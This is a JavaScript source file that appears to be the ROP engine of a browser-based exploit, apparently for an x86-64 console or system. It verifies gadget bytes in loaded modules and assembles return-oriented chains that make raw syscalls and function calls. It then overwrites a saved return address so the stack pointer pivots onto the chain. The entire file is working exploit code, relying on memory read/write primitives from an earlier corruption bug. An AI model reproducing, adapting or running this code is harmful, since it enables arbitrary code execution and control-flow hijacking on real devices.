var chain;

function gadget(instructions, module, address) {
	this.instructions = instructions;
	this.relativeAddress = address;
	this.checked = false;
	
	this.check = function() {
		if(!this.checked && this.instructions.length > 0) {
			var i;
			for(i = 0; i < this.instructions.length; i++) {
				if(getU8from(module_infos[module].image_base + address + i) != this.instructions[i]) {
					return false;
				}
			}
			
			// Check ends with ret
			if(getU8from(module_infos[module].image_base + address + this.instructions.length) != 0xc3) {
				return false;
			}
		}
		
		this.checked = true;
		return true;
	}
	
	this.address = function() {
		return module_infos[module].image_base + address;
	}
}

var checking = false;

function rop() {
	setBase(stack_base + return_va);
	var resp = getU64from(stack_base + return_va);
	this.data = stack_base + return_va + 0x420;
	var chainAddress = stack_base - 0x20000;
	var chainLength = 0;
	var variableAddresses = [];
	
	this.add = function() {
		var i;
		for(i = 0; i < arguments.length; i++) {
			if(typeof(arguments[i]) === "string") {
				if(checking && gadgets[arguments[i]].check() == false) throw(gadgets[arguments[i]].relativeAddress);
				setU64into(chainAddress + chainLength, gadgets[arguments[i]].address());
			}
			else {
				setU64into(chainAddress + chainLength, arguments[i]);
			}
			
			chainLength += 8;
		}
		
		return chainLength;
	}
	
	this.add("pop rbp", stack_base + return_va + 0x1400);
	
	this.add32 = function() {
		var i;
		for(i = 0; i < arguments.length; i++) {
			setU32into(chainAddress + chainLength, arguments[i]);
			
			chainLength += 4;
		}
		
		return chainLength;
	}
	
	this.syscall = function(name, systemCallNumber, arg1, arg2, arg3, arg4, arg5, arg6) {
		logAdd("syscall " + name);
		
		this.add("pop rax", systemCallNumber);
		if(typeof(arg1) !== "undefined") this.add("pop rdi", arg1);
		if(typeof(arg2) !== "undefined") this.add("pop rsi", arg2);
		if(typeof(arg3) !== "undefined") this.add("pop rdx", arg3);
		if(typeof(arg4) !== "undefined") this.add("pop rcx", arg4);
		if(typeof(arg5) !== "undefined") this.add("pop r8", arg5);
		if(typeof(arg6) !== "undefined") this.add("pop r9", arg6);
		this.add("mov r10, rcx; syscall");
	}
	
	this.call = function(name, module, address, arg1, arg2, arg3, arg4, arg5, arg6) {
		logAdd("call " + name);
		
		if(typeof(arg1) !== "undefined") this.add("pop rdi", arg1);
		if(typeof(arg2) !== "undefined") this.add("pop rsi", arg2);
		if(typeof(arg3) !== "undefined") this.add("pop rdx", arg3);
		if(typeof(arg4) !== "undefined") this.add("pop rcx", arg4);
		if(typeof(arg5) !== "undefined") this.add("pop r8", arg5);
		if(typeof(arg6) !== "undefined") this.add("pop r9", arg6);
		this.add(module_infos[module].image_base + address);
	}
	
	this.start = function(address) {
		logAdd("Starting code");
		
		setBase(0x926300000);
		u32[0x3FFFE] = gadgets["mov r10, rcx; syscall"].address() % 0x100000000;
		u32[0x3FFFF] = gadgets["mov r10, rcx; syscall"].address() / 0x100000000;
		
		this.add("pop rbp", stack_base + return_va - (chainLength + 8) + 0x1480);
		//this.add("pop rcx", "mov r10, rcx; syscall");
		this.add(address);
	}
	
	// Modifies rsi
	this.write_rax = function(address) {
		var valueAddress = this.add("pop rsi", address - 0x18) - 8;
		this.add("mov [rsi+0x18], rax");
		
		return valueAddress;
	}
	
	// Modifies rax
	this.write_rdi = function(address) {
		var valueAddress = this.add("pop rax", address - 0x60) - 8;
		this.add("mov [rax+0x60], rdi");
		
		return valueAddress;
	}
	
	// Modifies rax
	this.write_rdx = function(address) {
		var valueAddress = this.add("pop rax", address - 0x1e8) - 8;
		this.add("mov [rax+0x1e8], rdx");
		
		return valueAddress;
	}
	
	this.read_rax = function(address) {
		var valueAddress = this.add("pop rax", address - 0x830) - 8;
		this.add("mov rax, [rax+0x830]");
		
		return valueAddress;
	}
	
	this.read_rdi = function(address) {
		var valueAddress = this.add("pop rdi", address - 0x48) - 8;
		this.add("mov rdi, [rdi+0x48]");
		
		return valueAddress;
	}
	
	this.execute = function(afterExecution) {
		// Restore Stack Pointer
		this.add("pop rax", resp);
		this.write_rax(stack_base + return_va);
		this.add("pop rsp", stack_base + return_va);
		
		this.resolveVariables();
		
		// Redirect Stack Pointer to our ROP chain
		setU64into(stack_base + return_va, gadgets["pop rsp"].address());
		setU64into(stack_base + return_va + 8, chainAddress);
		
		setTimeout(function() {
			if(afterExecution) afterExecution();
		}, 1);
	}
	
	// Don't yet know where to store variables (depends on chainLength)
	// wait until entire ROP chain written, and evaluate the address in this.resolveVariables()
	this.write_rax_ToVariable = function(n) { variableAddresses.push({ number: n, address: this.write_rax(0), offset: -0x18 }); }
	this.write_rdi_ToVariable = function(n) { variableAddresses.push({ number: n, address: this.write_rdi(0), offset: -0x60 }); }
	this.write_rdx_ToVariable = function(n) { variableAddresses.push({ number: n, address: this.write_rdx(0), offset: -0x1e8 }); }
	this.read_rax_FromVariable = function(n) { variableAddresses.push({ number: n, address: this.read_rax(0), offset: -0x830 }); }
	this.read_rdi_FromVariable = function(n) { variableAddresses.push({ number: n, address: this.read_rdi(0), offset: -0x48 }); }
	
	this.resolveVariables = function() {
		var i;
		for(i = 0; i < variableAddresses.length; i++) {
			setU64into(chainAddress + variableAddresses[i].address, chainAddress + chainLength + variableAddresses[i].offset + variableAddresses[i].number * 8);
		}
	}
	
	this.getVariable = function(n) {
		return getU64from(chainAddress + chainLength + n * 8);
	}
	
	this.logVariable = function(n) {
		var v = getU64from(chainAddress + chainLength + n * 8);
		var s = "Variable " + n.toString() + " = 0x" + v.toString(16);
		if(errno[v]) s += " (" + errno[v] + ")";
		logAdd(s);
	}
}
